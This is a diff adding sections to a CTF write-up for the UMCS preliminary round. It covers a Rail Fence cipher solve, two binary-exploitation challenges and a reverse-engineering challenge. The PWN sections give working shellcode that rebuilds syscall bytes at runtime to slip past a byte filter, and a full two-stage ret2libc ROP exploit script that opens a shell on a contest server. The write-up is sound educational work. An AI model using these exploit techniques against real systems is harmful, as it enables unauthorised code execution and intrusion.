@@ -577,7 +577,7 @@ HERE[.......]IS[.......]YOUR[.......]PRIZE[.......]E012D0A1FFFAC42D6AAE00C54078A
 4. Applying the Rail Fence Cipher
 
 • The Rail Fence cipher is a transposition cipher that arranges text in a zigzag pattern across a specified number of "rails."
-• Using the hint that Samuel's favorite number is 8, we applied the Rail Fence decoder with 8 rails and Offset = 0.
+• Using the hint that Samuel's favorite number is 8, we applied the Rail Fence decoder with **_8 rails_** and Offset = 0.
 
 Decoding Process:
 
@@ -585,3 +585,561 @@ Decoding Process:
 2. Use an online Rail Fence decoder.
 3. Set the number of rails to 8.
 4. Apply the decryption algorithm.
+
+   ![](./image/Picture36.png)
+
+### Flag Extraction
+
+• After Rail Fence decryption, the result was properly formatted ASCII art.
+• When viewed with a monospaced font like Courier New, the ASCII art clearly displayed the flag.
+• Used Notepad to watch the flag in ASCII art view.
+
+![](./image/Picture37.png)
+
+Flag: `umcs{willow_tree_campsite}`
+
+### Takeaways
+
+• **Multi-Layer Encoding** – Data was hidden behind Morse code and a Rail Fence cipher.  
+• **Contextual Clues** – "Trains" and "8" were critical to solving the Rail Fence step.  
+• **Tool Flexibility** – Switching between Python scripting, and cipher tools was essential.
+
+# PWN
+
+## Babysc
+
+![](./image/Picture38.png)
+
+### Challenge Overview
+
+The "babysc" challenge is a binary exploitation task focused on shellcode injection with specific restrictions. The program allocates executable memory, reads in user input, and executes it as code, but with strict filters on certain byte sequences.
+
+### Vulnerability Analysis
+
+Looking at the source code (`babysc.c`) void function, we can identify the key components:
+
+```python
+void vuln(){
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    shellcode = mmap((void *)0x26e45000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
+
+    puts("Enter 0x1000");
+    shellcode_size = read(0, shellcode, 0x1000);
+    for (int i = 0; i < shellcode_size; i++)
+    {
+        uint16_t *scw = (uint16_t *)((uint8_t *)shellcode + i);
+        if (*scw == 0x80cd || *scw == 0x340f || *scw == 0x050f)
+        {
+            printf("Bad Byte at %d!\n", i);
+            exit(1);
+        }
+    }
+   puts("Executing shellcode!\n");
+    ((void(*)())shellcode)();
+}
+
+```
+
+The program:
+
+1. Allocates 0x1000 bytes of executable memory at address 0x26e45000
+2. Reads user input into this memory
+3. Scans for specific byte patterns:
+   • **0x80cd**: int **0x80** instruction (32-bit syscall)
+   • **0x340f** and **0x050f**: Parts of the syscall instruction (64-bit syscall)
+4. If no forbidden patterns are found, executes the provided shellcode
+
+Running **checksec** on the binary, and we found that:
+
+![](./image/Picture39.png)
+
+NX is not disabled – shellcode injection approach should be correct
+
+Thus, the challenge is clear: **input shellcode** that can spawn a shell without using standard syscall instructions.
+
+### Solution approach
+
+The real challenge here is that standard shellcode can't be used because it would contain either int 0x80 or syscall instructions, which trigger the filter. Our goal is to bypass this restriction and still spawn a shell.
+
+**Classic Technique: Self-modifying shellcode**
+
+Because the program only checks for forbidden bytes before execution — not during runtime — it's possible to write a shellcode that:
+• Writes the forbidden instruction (syscall) into memory dynamically.
+• Executes it after the check has already passed.
+
+Assembly Walkthrough
+
+1. Prepare **/bin/sh** for **execve**():
+   The code sets up the string /bin/sh on the stack and prepares the necessary arguments for the execve syscall.
+
+2. Setup **syscall** manually:
+   Instead of writing the 0x0f05 instruction directly (which would be blocked), the shellcode writes **safe placeholder bytes** and modifies them at runtime:
+
+```
+mov byte ptr [rbx], 0x0e      ; Write 0x0e
+inc byte ptr [rbx]           ; Now it becomes 0x0f
+mov byte ptr [rbx+1], 0x04   ; Write 0x04
+inc byte ptr [rbx+1]         ; Now it becomes 0x05
+call rbx                     ; Jump to the constructed syscall
+```
+
+This dynamic construction bypasses the static filter.
+
+**Assembly Source Code**
+
+```
+start:
+    xor rdi, rdi
+    push rdi
+    mov rdi, 0x68732f6e69622f  ; "/bin/sh" in ASCII
+    push rdi
+    mov rdi, rsp
+
+    push 59                   ; Syscall number for execve()
+    pop rax
+
+    xor rdx, rdx              ; Null pointer for envp
+    push rdx
+    push rdi
+    mov rsi, rsp              ; argv pointer setup
+
+    push rsp
+    pop rbx
+    sub rbx, 0x10             ; Choose a safe writable location
+
+    mov byte ptr [rbx], 0x0e  ; Partial 'syscall' instruction
+    inc byte ptr [rbx]        ; Make it 0x0f
+    mov byte ptr [rbx+1], 0x04
+    inc byte ptr [rbx+1]      ; Make it 0x05
+
+    call rbx                  ; Execute the patched syscall
+```
+
+**Generating Shellcode**
+
+Using pwntools:
+
+```
+from pwn import *
+
+context.arch = 'amd64'
+
+asm_code = """
+    xor rdi, rdi
+    push rdi
+    mov rdi, 0x68732f6e69622f
+    push rdi
+    mov rdi, rsp
+
+    push 59
+    pop rax
+
+    xor rdx, rdx
+    push rdx
+    push rdi
+    mov rsi, rsp
+
+    push rsp
+    pop rbx
+    sub rbx, 0x10
+
+    mov byte ptr [rbx], 0x0e
+    inc byte ptr [rbx]
+    mov byte ptr [rbx+1], 0x04
+    inc byte ptr [rbx+1]
+
+    call rbx
+"""
+
+shellcode = asm(asm_code)
+
+def hex_format(sc):
+    return ''.join('\\x{:02x}'.format(c) for c in sc)
+
+print(hex_format(shellcode))
+
+```
+
+Output:
+`\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x48\x89\xe7\x6a\x3b\x58\x48\x31\xd2\x52\x57\x48\x89\xe6\x54\x5b\x48\x83\xeb\x10\xc6\x03\x0e\xfe\x03\xc6\x43\x01\x04\xfe\x43\x01\xff\xd3`
+
+### Flag Extraction
+
+Using pwntools, we need to inject the shellcode to the remote server, spawn a shell and search for flag
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+shellcode = b"\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x48\x89\xe7\x6a\x3b\x58\x48\x31\xd2\x52\x57\x48\x89\xe6\x54\x5b\x48\x83\xeb\x10\xc6\x03\x0e\xfe\x03\xc6\x43\x01\x04\xfe\x43\x01\xff\xd3"
+
+def exploit():
+    p = remote("34.133.69.112", 10001)
+    p.recvuntil(b"Enter 0x1000")
+    p.send(shellcode)
+    p.interactive()
+
+if __name__ == "__main__":
+exploit()
+```
+
+![](./image/Picture40.png)
+
+The shellcode successfully bypassed the static instruction filter, triggered execve("/bin/sh"), and opened a remote shell. From there, as we search through directories, the flag was retrieved:
+
+Flag: `umcs{shellcoding_78b18b51641a3d8ea260e91d7d05295a}`
+
+### Takeaways
+
+• **Static Filters ≠ Runtime Security**
+Static byte filtering can be bypassed with runtime-generated instructions like self-modifying code.
+
+• **Self-Modifying Code is Powerful**
+Writing code that changes itself at runtime is a classic exploitation trick, especially when static analysis is the only check.
+
+• **Deep Understanding of Instruction Encoding**
+Knowing how assembly translates into machine bytes is crucial for developing filtered or stealthy shellcode.
+
+## Liveleak
+
+![](./image/Picture41.png)
+
+### Challenge Overview
+
+The **Liveleak** challenge is a classic binary exploitation task centered around memory leakage. The goal is to exploit a buffer overflow vulnerability to leak a libc address, calculate offsets, and spawn a shell to retrieve the flag.
+
+Goals:
+
+1. **Exploit a buffer overflow** to control program execution.
+2. **Leak a memory address** to bypass ASLR (Address Space Layout Randomization).
+3. **Calculate the libc base** address and locate system() and “/bin/sh”.
+4. **Spawn a shell** and read the flag
+
+### Vulnerability Analysis
+
+Running **checksec** on the binary showed:
+
+![](./image/Picture42.png)
+
+No canary and no PIE — perfect for a straightforward return address overwrite.
+Since NX enabled, ROP (Return-Oriented Programming) was necessary.
+
+# Protection Mechanisms
+
+| Protection     | Meaning                                  | Impact                                                                       |
+| -------------- | ---------------------------------------- | ---------------------------------------------------------------------------- |
+| **No Canary**  | Stack overflows are possible             | You can overwrite the return address.                                        |
+| **NX Enabled** | Stack cannot execute injected shellcode. | You must reuse existing code (ROP), leaking real memory address              |
+| **No PIE**     | Binary code address is predictable.      | The addresses of gadgets and **main** **function** are fixed and predictable |
+
+Disassembled the **vuln** function and revealed the core vulnerability
+
+![](./image/Picture43.png)
+
+The function allocates a 64-byte stack buffer, but **fgets** reads up to 128 bytes. This allows us to overflow the stack and control the return address.
+
+### Solution Approach
+
+1. **Calculating the Offset**
+   The overflow occurs after:
+   • 64 bytes of the buffer
+   • 8 bytes for the saved base pointer (rbp)
+   So the offset to the return address is 72 bytes.
+
+payload = b'A' \* 72 # Exactly enough to reach the return address
+
+On a 64-bit system, the stack layout looks like this during execution:
+
+| buffer (64 bytes) |
+| saved RBP (8 bytes) |
+| saved RIP (8 bytes) |
+
+Thus, when we reach and overwrite **RIP (Return Instruction Pointer)**, the program will walk through our crafted ROP chain step by step at runtime, executing our chosen instructions
+
+In later explanation, when the program hits ret:
+
+• **ret** pops the first address **(POP_RDI)** and jumps there.
+• **POP_RDI** loads the next stack value **(puts_got)** into **RDI**.
+• **ret** pops again, now landing on **puts_plt**, which calls **puts()**.
+• After **puts** prints the leaked address, the program uses the next address **(main)** to restart.
+
+This is how the ROP chain flows, the program executes it **step by step** as if you're chaining function calls.
+
+2. **Explanation on leaking an address**
+   Focus with ASLR (Address Space Layout Randomization)
+   Eventhough we control the ret address, we don’t know where **system()** is located, because every time the program runs, libc is loaded at a different (random) address.
+
+So before calling **system()**, we must:
+
+1. **Leak a real address** like puts from **libc**
+2. Calculate the base address of **libc** using:
+   libc_base = leaked_puts_address - offset_of_puts
+3. Use this **libc_base** to compute the real **system()** and “/bin/sh” address.
+
+Choosing **system(“/bin/sh”)**:
+• Gain a shell
+• Use it to run command
+• Retrieve a flag
+
+Leaking puts:
+• Always present in GOT (Global Offset Table)
+• Easy to leak via a ROP chain
+• Its offset inside libc is known, so once we leak it, we can compute all other important addresses
+
+3. Building the Leak Payload
+   • Leak **puts** real address
+   • Calculate **libc_base**
+   • Calculate **system()** and **“/bin/sh”**
+   • Call **system(“/bin/sh”)** to get a shell
+
+To leak puts, we created a ROP chain
+
+```
+payload = b'A' * 72
+payload += p64(POP_RDI)         # pop rdi; ret
+payload += p64(elf.got['puts']) # Address of puts in GOT
+payload += p64(elf.plt['puts']) # Call puts to print its real address
+payload += p64(elf.symbols['main'])  # Restart the program
+```
+
+4. **Extracting the leaked address**
+
+When the program prints the leaked address, the output contains junk. But the valid memory address always starts at byte 2.
+
+So we extracted as below:
+
+```
+leaked_bytes = leak_data[2:8] # Grab 6 bytes
+leaked_addr = u64(leaked_bytes.ljust(8, b'\x00')) # Pad to 8
+```
+
+Once we had the leaked address, calculate libc_base next:
+
+```
+libc_base = leaked_addr - libc.symbols['puts']
+```
+
+5. **Build the Final Payload**
+
+Now that we know **libc_base**, we can compute the real addresses:
+
+```
+system_addr = libc_base + libc.symbols['system']
+binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
+```
+
+And craft a second ROP chain to call **system(“/bin/sh”)**:
+
+```
+payload = b'A' \* 72
+payload += p64(RET) # Stack alignment (16-byte rule)
+payload += p64(POP_RDI) # pop rdi; ret
+payload += p64(binsh_addr) # Address of "/bin/sh"
+payload += p64(system_addr) # Address of system()
+```
+
+### Flag Extraction
+
+The final compilation of exploit script:
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+# Set context for the architecture
+context.arch = 'amd64'
+context.os = 'linux'
+context.log_level = 'info'  # Set to info for cleaner output
+
+# Target information
+ip = '34.133.69.112'
+port = 10007
+
+def exploit():
+    # Load the binary and libc
+    elf = ELF('./chall')
+    libc = ELF('./libc.so.6')
+
+    # Get important addresses
+    puts_plt = elf.plt['puts']
+    puts_got = elf.got['puts']
+    main_addr = elf.symbols['main']
+
+    # ROP gadgets
+    POP_RDI = 0x4012bd  # pop rdi; ret
+    RET = 0x4012c3      # ret (for stack alignment)
+
+    # Connect to the target server
+    conn = remote(ip, port)
+
+    # Receive the prompt
+    conn.recvuntil(b"Enter your input:")
+
+    # ============ Stage 1: Leak libc address ============
+
+    # Buffer overflow offset
+    offset = 72  # 64 bytes buffer + 8 bytes saved rbp
+
+    # Build ROP chain to leak puts address
+    payload = b'A' * offset
+    payload += p64(POP_RDI)
+    payload += p64(puts_got)
+    payload += p64(puts_plt)
+    payload += p64(main_addr)
+
+    # Send payload
+    log.info("Stage 1: Sending leak payload")
+    conn.sendline(payload)
+
+    # Receive response
+    leak_data = conn.recvuntil(b"Enter your input:")
+
+    # Extract leaked address
+    leaked_bytes = leak_data[2:8]  # Position 2, size 6
+    leaked_addr = u64(leaked_bytes.ljust(8, b'\x00'))
+    log.success(f"Leaked puts address: {hex(leaked_addr)}")
+
+    # Calculate libc base
+    libc_base = leaked_addr - libc.symbols['puts']
+    log.success(f"Libc base address: {hex(libc_base)}")
+
+    # Calculate needed function addresses
+    system_addr = libc_base + libc.symbols['system']
+    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
+
+    log.info(f"System address: {hex(system_addr)}")
+    log.info(f"'/bin/sh' address: {hex(binsh_addr)}")
+
+    # ============ Stage 2: Execute system("/bin/sh") ============
+
+    log.info("Stage 2: Sending shell payload")
+
+    payload = b'A' * offset
+    payload += p64(RET)        # For stack alignment
+    payload += p64(POP_RDI)    # Set RDI (1st argument)
+    payload += p64(binsh_addr) # Pointer to "/bin/sh" string
+    payload += p64(system_addr) # Call system
+
+    # Send payload
+    conn.sendline(payload)
+
+    # Switch to interactive mode
+    log.success("Shell obtained! Switching to interactive mode.")
+    conn.interactive()
+
+if __name__ == "__main__":
+    exploit()
+
+```
+
+Execute the script and we got access to the shell:
+
+![](./image/Picture44.png)
+
+Retrieve the flag:
+
+![](./image/Picture45.png)
+
+Flag: `umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}`
+
+### Takeaways
+
+• NX makes shellcode injection impossible.
+• Modern exploits rely on ROP + libc functions instead.
+• Leaking a function address (like puts) is essential to calculate the randomized memory layout (bypassing ASLR).
+• Calling system("/bin/sh") is a reliable way to get shell access.
+• Once we have the shell, the flag is just one command away.
+
+# Reverse Engineering
+
+## Http-server
+
+![](./image/Picture46.png)
+
+### Executive Summary
+
+During analysis of the serever binary, we identified a simple TCP server written in C that processes raw HTTP-like requests. Upon correct request parsing, the server reveals a flag by reading the /flag file.
+
+### Case Details
+
+![](./image/Picture47.png)
+
+| Property       | Value                                           |
+| -------------- | ----------------------------------------------- |
+| Challenge Type | Reverse Engineering                             |
+| Target Binary  | ELF 64-bit executable (Linux)                   |
+| Architecture   | X86_64                                          |
+| Analysis Goal  | Trigger the flag leak logic via crafted request |
+| Linkage Type   | Dynamically linked                              |
+| Stripped       | ✅                                              |
+
+As the file was stripped, it has all its symbol names removed:
+• Function names (main, printf,...)
+• Variable names
+• Debugging info
+
+### Static Analysis
+
+1. Perform decompilation with ghidra
+
+Note that it was stripped, we should find the main function from the entry function
+
+![](./image/Picture48.png)
+
+2. In this **Entry Point:** **FUN_001013a9**
+
+![](./image/Picture49.png)
+
+This function is responsible for **setting up the TCP server**, using standard BSD socket operations.
+
+At this point we found a **handler function**, that is,
+FUN_0010154b() which invoked for interactions
+
+3. In this **Request Handler: FUN_0010154b**
+
+This function **receives raw data from the client** and determines the response based on the request contents.
+
+![](./image/Picture50.png)
+
+Key Logic:
+• Use **strstr()** to **search for a specific request string**:
+`strstr(pcVar2, "GET /goodshit/umcs_server HTTP/13.37")`
+strstr(a, b) searches for the substing b inside the string a.
+
+• If not found (where strstr() returns **NULL**) -> and reply:
+
+```
+HTTP/1.1 404 Not Found
+Content-Type: text/plain
+
+Not here buddy
+```
+
+• If the string is found, the server proceeds to open /flag and send its contents back to the client.
+
+### Flag Extraction
+
+1. Connect to the server using netcat
+   nc 34.133.69.112 8080
+
+2. Enter the payload “**GET /goodshit/umcs_server HTTP/13.37**”
+   Retrieve the **flag**
+
+![](./image/Picture51.png)
+
+Flag: `umcs{http_server_a058712ff1da79c9bbf211907c65a5cd}`
+
+### Takeaways
+
+• As the binary was stripped, we should start our static analysis from the entry symbol
+• strstr() function check if the string literals is existed from user input
+
+# UMCS CTF Preliminary Round Scoreboard
+
+![](./image/Picture52.png)
+![](./image/Picture53.png)
